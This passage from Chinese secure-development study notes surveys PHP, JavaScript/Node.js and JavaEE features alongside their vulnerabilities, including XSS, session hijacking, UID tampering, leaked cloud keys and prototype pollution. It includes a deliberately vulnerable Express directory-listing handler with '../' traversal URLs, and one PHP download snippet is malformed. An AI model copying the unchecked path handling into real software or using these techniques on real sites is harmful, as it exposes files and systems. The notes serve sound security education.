    <content type="html"><![CDATA[<h1 id="安全开发"><a href="#安全开发" class="headerlink" title="安全开发"></a>安全开发</h1><p>‍</p><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><p>‍</p><h4 id="原生类"><a href="#原生类" class="headerlink" title="原生类"></a>原生类</h4><p>‍</p><h5 id="留言板功能"><a href="#留言板功能" class="headerlink" title="留言板功能"></a>留言板功能</h5><p>‍</p><h6 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h6><p>‍</p><p><strong>PHP函数-连接，选择，执行，关闭等</strong></p><p>参考：<a href="https://www.runoob.com/php/php-ref-mysqli.html">MySQLi函数</a></p><p>常用：</p><p><code>mysqli_connect()</code>​ 打开一个到MySQL的新的连接。</p><p><code>mysqli_select_db()</code>​ 更改连接的默认数据库。</p><p><code>mysqli_query()</code>​ 执行某个针对数据库的查询。</p><p><code>mysqli_fetch_row()</code>​ 从结果集中取得一行，并作为枚举数组返回。</p><p><code>mysqli_close()</code>​ 关闭先前打开的数据库连接。</p><p>‍</p><p><strong>MYSQL增删改查</strong></p><ol><li><p>查询select</p> <figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> 表名 <span class="hljs-keyword">where</span> 列名=‘条件’;<br></code></pre></td></tr></table></figure></li><li><p>删除delete</p> <figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> 表名 <span class="hljs-keyword">where</span> 列名 = ‘条件’;<br></code></pre></td></tr></table></figure></li><li><p>增加insert</p> <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">insert</span> into 表名(`列名<span class="hljs-number">1</span>`, `列名<span class="hljs-number">2</span>`) value(&#x27;列<span class="hljs-number">1</span>值<span class="hljs-number">1</span>&#x27;, ‘列<span class="hljs-number">2</span>值<span class="hljs-number">2</span>’);<br></code></pre></td></tr></table></figure></li><li><p>更新update</p> <figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">update</span> 表名 <span class="hljs-keyword">set</span> 列名 = 数据 <span class="hljs-keyword">where</span> 列名 = <span class="hljs-string">&#x27;条件&#x27;</span>；<br></code></pre></td></tr></table></figure></li></ol><p>‍</p><h6 id="数据传递（全局变量）"><a href="#数据传递（全局变量）" class="headerlink" title="数据传递（全局变量）"></a>数据传递（全局变量）</h6><p>参考：<a href="https://www.w3school.com.cn/php/php_superglobals.asp">PHP全局变量-超全局变量</a></p><pre><code class="hljs">   [PHP手册-超全局变量](https://www.php.net/manual/zh/language.variables.superglobals.php)</code></pre><ul><li><p>$GLOBALS：这种全局变量用于在 PHP 脚本中的任意位置访问全局变量</p></li><li><p>$_SERVER：这种超全局变量保存关于报头、路径和脚本位置的信息。</p></li><li><p>$_REQUEST ： $_REQUEST：用于收集 HTML 表单提交的数据。</p></li><li><p>$_POST：广泛用于收集提交method&#x3D;“post” 的HTML表单后的表单数据。</p></li><li><p>$_GET：收集URL中的发送的数据。也可用于收集提交HTML表单数据(method&#x3D;“get”) $_FILES：文件上传且处理包含通过HTTP POST方法上传给当前脚本的文件内容。</p></li><li><p>$_ENV：是一个包含服务器端环境变量的数组。</p></li><li><p>$_COOKIE：是一个关联数组，包含通过cookie传递给当前脚本的内容。</p></li><li><p>$_SESSION：是一个关联数组，包含当前脚本中的所有session内容。</p></li></ul><p>‍</p><h6 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h6><ul><li>留言板输出输入存在XSS</li><li>留言板使用第三方编辑器插件（编辑器插件漏洞）</li></ul><p>‍</p><p>‍</p><h5 id="后台验证功能"><a href="#后台验证功能" class="headerlink" title="后台验证功能"></a>后台验证功能</h5><p>‍</p><h6 id="鉴权技术"><a href="#鉴权技术" class="headerlink" title="鉴权技术"></a>鉴权技术</h6><ul><li><p>cookie</p><p>通俗点说cookie就像通讯录中的人，打过一次电话之后被记录在通讯录中，后续直接从通讯录中打就可以</p><p>生成cookie的原理图</p><p><img src="/assets/image-20240629143532-1ewrb89.png" alt="image">​</p></li><li><p>session</p><p>通俗点说session就像打电话，电话没挂session就一直有效，挂了就直接失效</p><p>生成session的原理图</p></li><li><ol><li>客户端向服务器发送HTTP请求。</li><li>服务器为客户端生成一个唯一的session ID，并将其存储在服务器端的存储器中（如文件、数据库等）。</li><li>服务器将生成的session ID作为一个cookie发送给客户端。</li><li>客户端将session ID保存为一个cookie，通常是在本地浏览器中存储。</li><li>当客户端在发送下一次HTTP请求时，它会将该cookie信息附加到请求头中，以便服务器可以通过该session ID来识别客户端。</li><li>服务器使用session ID来检索存储在服务器端存储器中的与该客户端相关的session数据，从而在客户端和服务器之间共享数据。</li></ol><p><img src="/assets/image-20240629143629-ktl0i7c.png" alt="image">​</p></li></ul><p>‍</p><p><strong>Cookie与Session的异同</strong></p><p>相同点：</p><ul><li>Cookie和Session都是用来在Web应用程序中跟踪用户状态的机制</li></ul><p>不同点：</p><ol><li><p>存储位置不同：<br> Cookie是存储在客户端（浏览器）上的，而Session是存储在服务器端的。</p></li><li><p>安全性不同：<br> Cookie存储在客户端上，可能会被黑客利用窃取信息，而Session存储在服务器上，更加安全。</p></li><li><p>存储容量不同：<br> Cookie的存储容量有限，一般为4KB，而Session的存储容量理论上没有限制，取决于服务器的硬件和配置。</p></li><li><p>生命周期不同：<br> Cookie可以设置过期时间，即便关闭浏览器或者重新打开电脑，Cookie仍然存在，直到过期或者被删除。而Session一般默认在浏览器关闭后就会过期。</p></li><li><p>访问方式不同：<br> Cookie可以通过JavaScript访问，而Session只能在服务器端进行访问。</p></li><li><p>使用场景不同：<br> Cookie一般用于存储小型的数据，如用户的用户名和密码等信息。而Session一般用于存储大型的数据，如购物车、登录状态等信息。</p></li></ol><p>‍</p><h6 id="安全防御"><a href="#安全防御" class="headerlink" title="安全防御"></a>安全防御</h6><ul><li><p>token</p><ol><li><p>身份验证：<br> 采用token机制的Web应用程序，用户在登录成功后会收到一个token，这个token可以在每次请求时发送给服务器进行身份验证。而不采用token机制的Web应用程序，一般会使用session机制来保存用户登录状态，服务器会在用户登录成功后创建一个session，之后的每个请求都需要在HTTP头中附带这个session ID，以便服务器能够验证用户身份。</p></li><li><p>安全性：<br> 采用token机制的Web应用程序，在服务器上不会存储用户的登录状态，只需要存储token即可。因此，即使token被盗取，黑客也无法获得用户的密码或者其他敏感信息。而不采用token机制的Web应用程序，一般会在服务器上存储用户的登录状态，因此如果服务器被黑客攻击，黑客可能会获得用户的敏感信息。</p></li><li><p>跨域访问：<br> 采用token机制的Web应用程序，在跨域访问时，可以使用HTTP头中的Authorization字段来传递token信息，方便实现跨域访问。而不采用token机制的Web应用程序，在跨域访问时，需使用cookie或session来传递用户身份信息，比较麻烦。</p></li><li><p>总结<br> 总之，采用token机制可以提高Web应用程序的安全性，并且方便实现跨域访问。不过，使用token机制也需要开发者自己来实现身份验证和token的生成和验证，相对来说比较复杂。而不采用token机制，使用session机制则相对简单，但是安全性相对较低。因此，具体采用哪种机制，需要根据实际情况进行权衡和选择。</p></li></ol></li><li><p>判断数据包唯一性</p></li></ul><p>‍</p><h6 id="安全问题-1"><a href="#安全问题-1" class="headerlink" title="安全问题"></a>安全问题</h6><ul><li>cookie客户端获取并模拟用户</li><li>session会话劫持模拟用户</li></ul><p>‍</p><p>‍</p><h5 id="文件管理功能"><a href="#文件管理功能" class="headerlink" title="文件管理功能"></a>文件管理功能</h5><p>‍</p><h6 id="数据传递（全局变量）-1"><a href="#数据传递（全局变量）-1" class="headerlink" title="数据传递（全局变量）"></a>数据传递（全局变量）</h6><ul><li>$_GET</li><li>$_POST</li><li>$_FILES</li><li>$_REQUEST</li><li>$_SERVER</li></ul><p>‍</p><h6 id="安全问题-2"><a href="#安全问题-2" class="headerlink" title="安全问题"></a>安全问题</h6><ul><li><p>目录遍历</p></li><li><p>文件显示</p><ol><li>打开目录读取文件列表</li><li>递归循环读取文件列表</li><li>判断是文件还是文件夹</li><li>PHP.INI目录访问控制</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">is_dir</span>() 函数用于检查指定的路径是否是一个目录<br><span class="hljs-title function_ invoke__">opendir</span>() 函数用于打开指定的目录，返回句柄，用来读取目录中的文件和子目录<br><span class="hljs-title function_ invoke__">readdir</span>() 函数用于从打开的目录句柄中读取目录中的文件和子目录<br>open_basedir：PHP.INI中的设置用来控制脚本程序访问目录<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-keyword">__DIR__</span>); 设置配置文件中，只能访问本目录<br></code></pre></td></tr></table></figure></li><li><p>文件编辑</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">file_get_contents</span>() 读取文件内容<br><span class="hljs-title function_ invoke__">fopen</span>() <span class="hljs-title function_ invoke__">fread</span>() 文件打开读入<br></code></pre></td></tr></table></figure></li><li><p>文件上传</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">架构：<br><span class="hljs-number">1</span>、上传至服务器本身的存储磁盘(源码在一起)<br><span class="hljs-number">2</span>、云产品OSS存储对象去存储文件(泄漏安全：打开upload.js文件可能会泄露accessid和accesskey，如果有这两个东西，就可以使用OSS浏览器进行访问)<br><span class="hljs-number">3</span>、文件上传到其他域名（例如：www.test.com--&gt;upload.test.com并且此时upload.test.com没有配置任何可以解析文件的环境）<br></code></pre></td></tr></table></figure></li><li><p>文件包含</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>() 在错误发生后脚本继续执行<br><span class="hljs-keyword">require</span>() 在错误发生后脚本停止执行<br><span class="hljs-keyword">include_once</span>() 如果已经包含，则不再执行<br><span class="hljs-keyword">require_once</span>() 如果已经包含，则不再执行<br></code></pre></td></tr></table></figure></li><li><p>文件删除</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">unlink</span>() 文件删除函数<br>调用命令删除：system shell_exec exec等<br></code></pre></td></tr></table></figure></li><li><p>文件下载</p><p>修改HTTP头实现文件读取解析下载：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">header</span>(“Content-<span class="hljs-attr">Type</span>: application/octet-stream”);<br><span class="hljs-title function_ invoke__">header</span>(“Content-<span class="hljs-attr">Disposition</span>: attachment; filename=”<span class="hljs-string">&quot;);</span><br><span class="hljs-string">header(&quot;</span>Content-<span class="hljs-attr">Length</span>: <span class="hljs-string">&quot; . filesize(file)) ;readfile( file));</span><br><span class="hljs-string">readfile(file));readfile(file);</span><br></code></pre></td></tr></table></figure></li></ul><p>‍</p><h6 id="前端模板功能"><a href="#前端模板功能" class="headerlink" title="前端模板功能"></a>前端模板功能</h6><ul><li><p>安全问题</p><p>自写模板安全问题</p><p>第三方模板—如Smarty&lt;3.1.32模板漏洞</p></li></ul><p>‍</p><p>‍</p><p>‍</p><p>‍</p><h4 id="框架类-Thinkphp"><a href="#框架类-Thinkphp" class="headerlink" title="框架类-Thinkphp"></a>框架类-Thinkphp</h4><p>‍</p><h5 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h5><p>参考<a href="https://www.kancloud.cn/manual/thinkphp5_1/353946">ThinkPHP5.1完全开发手册</a></p><ul><li><p>配置架构-导入使用</p></li><li><p>前端页面渲染-MVC模型</p></li><li><p>路由访问-URL访问</p></li><li><p>文件上传-应用对象</p></li><li><p>数据库操作-应用对象</p></li></ul><p>‍</p><h5 id="安全问题-3"><a href="#安全问题-3" class="headerlink" title="安全问题"></a>安全问题</h5><ul><li>不合规写法</li><li>内置过滤绕过</li><li>版本安全漏洞</li></ul><p>‍</p><p><strong>逻辑越权原理：</strong> 在设计数据库的时候，仅仅使用UID来限制用户权限的等级，这种设计可以通过抓包的方法来修改UID的值获得更高的权限。</p><p>‍</p><p>‍</p><p>‍</p><h3 id="Javascript"><a href="#Javascript" class="headerlink" title="Javascript"></a>Javascript</h3><p>‍</p><p>‍</p><h4 id="原生类-1"><a href="#原生类-1" class="headerlink" title="原生类"></a>原生类</h4><p>特性：前端有代码</p><ol><li>原生JS教程<br> <a href="https://www.w3school.com.cn/js/index.asp">https://www.w3school.com.cn/js/index.asp</a></li><li>jQuery库教程<br> <a href="https://www.w3school.com.cn/jquery/index.asp">https://www.w3school.com.cn/jquery/index.asp</a></li></ol><h5 id="AJAX"><a href="#AJAX" class="headerlink" title="AJAX"></a>AJAX</h5><ul><li>文件上传</li><li>登录验证</li><li>商品购买</li></ul><p>‍</p><h5 id="DOM树-文档操作对象"><a href="#DOM树-文档操作对象" class="headerlink" title="DOM树-文档操作对象"></a>DOM树-文档操作对象</h5><ul><li><p>获取HTML代码中函数的值，可以操作网页代码内容，实现自主或用户交互动作反馈</p></li><li><p>安全问题：本身的前端代码通过DOM技术实现代码的更新修改，但是更新修改如果修改的数据可以由用户来指定，就会造成DOM-XSS攻击！</p></li><li><p>获取对象</p><p>标签：直接写</p><p>Class：加上符号.</p><p>id：加上符号#</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- 这是标题 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;myHeader&quot;</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;getValue()&quot;</span>&gt;</span>这是标题<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- 选择第一个 h1 元素 --&gt;</span><br>document.querySelector(&#x27;h1&#x27;)<br><br><span class="hljs-comment">&lt;!-- 选择所有具有 &#x27;id&#x27; 类的元素 --&gt;</span><br>document.querySelector(&#x27;.id&#x27;)<br><br><span class="hljs-comment">&lt;!-- 选择具有 &#x27;myHeader&#x27; id 的元素 --&gt;</span><br>document.querySelector(&#x27;#myHeader&#x27;)<br></code></pre></td></tr></table></figure></li><li><p>获取对象属性</p><p><code>console.log()</code>​ 是一个用于输出信息到控制台的方法，而 <code>const</code>​ 是一个关键字，用于声明只读的常量变量。它们在功能和用途上是完全不同的</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;myHeader&quot;</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;getValue()&quot;</span>&gt;</span>这是标题<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- JavaScript代码 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-comment">// 选择第一个 h1 元素</span></span><br><span class="language-javascript">  <span class="hljs-keyword">const</span> h1 = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;h1&#x27;</span>);</span><br><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-comment">// 获取 h1 元素的 id 属性</span></span><br><span class="language-javascript">  <span class="hljs-keyword">const</span> id = h1.<span class="hljs-property">id</span>;</span><br><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-comment">// 输出 id 到控制台</span></span><br><span class="language-javascript">  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(id);</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>操作元素数据</p><p><code>innerHTML</code>​ 解析后续代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html">var element = document.getElementById(&quot;myElement&quot;);<br>var htmlContent = element.innerHTML; // 获取元素的内容（包括 HTML 标记）<br>element.innerHTML = &quot;<span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>New Content<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span>&quot;; // 设置元素的内容，并解析 HTML 标记<br></code></pre></td></tr></table></figure><p><code>innerText</code>​ 不解析后续代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html">var element = document.getElementById(&quot;myElement&quot;);<br>var textContent = element.innerText; // 获取元素的纯文本内容<br>element.innerText = &quot;New Text Content&quot;; // 设置元素的纯文本内容<br></code></pre></td></tr></table></figure></li><li><p>操作元素属性</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;iphone.jpg&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;300&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;300&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">function</span> <span class="hljs-title function_">update</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">        <span class="hljs-keyword">const</span> s=<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;img&#x27;</span>)</span><br><span class="language-javascript">        s.<span class="hljs-property">src</span>=<span class="hljs-string">&#x27;huawei.png&#x27;</span></span><br><span class="language-javascript">        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(s.<span class="hljs-property">src</span>)</span><br><span class="language-javascript">        <span class="hljs-comment">//如果这里huawei.png为一个变量由用户传递决定，那么就会造成DOM XSS**</span></span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ul><p>‍</p><h5 id="加密编码"><a href="#加密编码" class="headerlink" title="加密编码"></a>加密编码</h5><ul><li><p>分析代码过程：发出疑问如果加密格式不显示出来，怎样判断加密的方式是什么</p></li><li><p><strong>可以借助检查的控制台，尝试输入获取加密后的密码值，再和提交表单的加密值进行比对，若一致则证明识别出。（一般安全防护比较强的，不会把运行的所以东西全加载到浏览器上）</strong></p></li><li><p>第三方js</p><p>AES</p><p>DES</p><p>BASE64</p><p>….</p></li></ul><p>‍</p><h5 id="安全问题-4"><a href="#安全问题-4" class="headerlink" title="安全问题"></a>安全问题</h5><ul><li>DOM-XSS</li><li>前端算法泄露</li><li>前端验证脆弱性</li></ul><p>‍</p><p>‍</p><h4 id="框架类"><a href="#框架类" class="headerlink" title="框架类"></a>框架类</h4><p>‍</p><h5 id="Node-JS"><a href="#Node-JS" class="headerlink" title="Node.JS"></a>Node.JS</h5><p>开发指南-NodeJS-安全SecGuide项目</p><p><a href="https://github.com/Tencent/secguide">https://github.com/Tencent/secguide</a></p><ol><li><p>文档参考：<a href="https://www.w3cschool.cn/nodejs/">https://www.w3cschool.cn/nodejs/</a></p></li><li><p>Nodejs安装：<a href="https://nodejs.org/en">https://nodejs.org/en</a></p></li><li><p>三方库安装</p><ol><li><p>express<br> Express是一个简洁而灵活的node.js Web应用框架</p></li><li><p>body-parser<br> node.js中间件，用于处理 JSON, Raw, Text和URL编码的数据。</p></li><li><p>cookie-parser<br> 这就是一个解析Cookie的工具。通过req.cookies可以取到传过来的cookie，并把它们转成对象。</p></li><li><p>multer<br> node.js中间件，用于处理 enctype=“multipart&#x2F;form-data”（设置表单的MIME编码）的表单数据。</p></li><li><p>mysql<br> Node.js来连接MySQL专用库，并对数据库进行操作</p></li><li><p>安装命令</p> <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell">npm i express<br>npm i body<span class="hljs-literal">-parser</span><br>npm i cookie<span class="hljs-literal">-parser</span><br>npm i multer<br>npm i mysql<br></code></pre></td></tr></table></figure></li></ol></li></ol><ul><li><h6 id="实现功能"><a href="#实现功能" class="headerlink" title="实现功能"></a>实现功能</h6><p>文件操作</p><p>数据库操作</p><p>Express</p></li><li><h6 id="安全问题-5"><a href="#安全问题-5" class="headerlink" title="安全问题"></a>安全问题</h6><ul><li><p>前端无代码</p></li><li><p>常规漏洞</p><ol><li><p>SQL注入</p></li><li><p>文件操作</p><p> 实现目录读取</p><ul><li>调用文件管理函数，传递目录参数</li><li><a href="http://127.0.0.1:3000/file?dir=./">http://127.0.0.1:3000/file?dir=./</a></li><li><a href="http://127.0.0.1:3000/file?dir=../">http://127.0.0.1:3000/file?dir=…/</a></li></ul> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 引入文件系统和 Express 框架</span><br><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br><br><span class="hljs-comment">// 处理 &#x27;/file&#x27; 路径的 GET 请求</span><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/file&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>    <span class="hljs-comment">// 从请求中获取目录参数</span><br>    <span class="hljs-keyword">const</span> dir = req.<span class="hljs-property">query</span>.<span class="hljs-property">dir</span>;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(dir);<br><br>    **<span class="hljs-comment">// 调用文件管理函数，传递目录参数</span><br>    <span class="hljs-title function_">filemanage</span>(dir);**<br>&#125;);<br><br><span class="hljs-comment">// 启动 Express 应用监听在3000端口</span><br><span class="hljs-keyword">var</span> server = app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Web应用已启动在3000端口！&#x27;</span>);<br>&#125;);<br><br><span class="hljs-comment">// 文件管理函数，接收一个目录参数</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">filemanage</span>(<span class="hljs-params">dir</span>) &#123;<br>    **<span class="hljs-comment">// 使用 fs.readdir 读取目录下的文件</span><br>    fs.<span class="hljs-title function_">readdir</span>(dir, <span class="hljs-keyword">function</span> (<span class="hljs-params">error, files</span>) &#123;<br>        <span class="hljs-comment">// 打印目录中的文件列表</span><br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(files);**<br>    &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><p> <img src="/assets/image-20240707161007-pi5749l.png" alt="image">​</p></li><li><p>RCE执行</p><ol><li>eval 调用<strong>代码命令执行</strong>，将字符串当做代码解析</li><li>exec &amp; spawnSync <strong>调用系统命令</strong></li></ol></li></ol></li><li><p>原型链污染</p><ol><li>如果攻击者控制并修改了一个对象的原型，(<strong>proto</strong>)</li><li>那么将可以影响所有和这个对象来自同一个类、父祖类的对象</li></ol></li></ul></li></ul><p>‍</p><p>‍</p><h4 id="第三方组件类"><a href="#第三方组件类" class="headerlink" title="第三方组件类"></a>第三方组件类</h4><p>‍</p><h5 id="第三方JS库"><a href="#第三方JS库" class="headerlink" title="第三方JS库"></a>第三方JS库</h5><ul><li><p>JQuery</p><p>jQuery是一个快速、简洁的<a href="https://so.csdn.net/so/search?q=JavaScript%E6%A1%86%E6%9E%B6&spm=1001.2101.3001.7020">JavaScript框架</a>,是一个丰富的JavaScript代码库。设计目的是为了写更少的代码，做更多的事情。它封装JavaScript常用功能代码，提供一种简便的JavaScript设计模式，优化HTML文档操作、事件处理、动画设计和Ajax交互。</p></li><li><p>CVE漏洞</p><p>检测：<a href="http://research.insecurelabs.org/jquery/test/">http://research.insecurelabs.org/jquery/test/</a></p><p>CVE-2020-11022&#x2F;CVE-2020-11023</p><p>参考：<a href="https://blog.csdn.net/weixin_44309905/article/details/120902867">Javascript框架库漏洞验证</a></p></li></ul><p>‍</p><h5 id="第三方工具"><a href="#第三方工具" class="headerlink" title="第三方工具"></a>第三方工具</h5><ul><li><p>WebPack</p><p>Webpack是一个模块打包器。在Webpack中会将前端的所有资源文件都作为模块处理。它将根据模块的依赖关系进行分析，生成对应的资源。</p><p>参考：<a href="https://mp.weixin.qq.com/s/J3bpy-SsCnQ1lBov1L98WA">一文看懂webpack打包操作</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript">使用 <span class="hljs-title class_">Webpack</span> 的主要原因：<br><span class="hljs-number">1.</span> 模块化支持：<span class="hljs-title class_">Webpack</span> 支持将应用程序拆分为模块，使开发人员能够使用模块化的方式组织和管理代码。模块化能够提高代码的可维护性、重用性和可测试性。<br><span class="hljs-number">2.</span> 资源打包：<span class="hljs-title class_">Webpack</span> 可以将项目中的各种资源（例如 <span class="hljs-title class_">JavaScript</span>、<span class="hljs-variable constant_">CSS</span>、图像等）视为模块，并将它们打包成一个或多个最终的静态资源文件。这样可以减少网络请求的次数，提高应用程序的加载性能。<br><span class="hljs-number">3.</span> 代码分割：<span class="hljs-title class_">Webpack</span> 支持将应用程序的代码分割成多个块（chunks），并在需要时按需加载。这种代码分割的技术可以提高应用程序的初始加载速度，并减小用户需要下载的初始文件大小。<br><span class="hljs-number">4.</span> 资源优化：<span class="hljs-title class_">Webpack</span> 提供了丰富的插件和工具生态系统，可以进行各种资源优化和转换，例如压缩代码、处理样式预处理器、优化图像等。这些优化可以减小资源文件的大小，提高应用程序的性能。<br><span class="hljs-number">5.</span> 开发环境支持：<span class="hljs-title class_">Webpack</span> 提供了强大的开发环境支持，包括开发服务器、热模块替换（<span class="hljs-title class_">Hot</span> <span class="hljs-title class_">Module</span> <span class="hljs-title class_">Replacement</span>）、源代码映射等功能。这些功能可以提升开发效率，加快开发周期。<br></code></pre></td></tr></table></figure></li><li><p>源码泄露</p><p>原生态JS：前端语言直接浏览器显示源代码</p><p>NodeJS：服务段语言浏览器不显示源代码</p><p>WebPack：打包模式选择开发者模式后会造成源码泄漏（nodejs vue）</p></li></ul><p>‍</p><p>‍</p><h3 id="JavaEE"><a href="#JavaEE" class="headerlink" title="JavaEE"></a>JavaEE</h3><p>‍</p><h4 id="原生类-2"><a href="#原生类-2" class="headerlink" title="原生类"></a>原生类</h4><p>‍</p><h5 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h5><p>参考：<a href="https://blog.csdn.net/qq_52173163/article/details/121110753">JAVAEE的核心-Servlet</a></p><pre><code class="hljs">**Servlet是Server 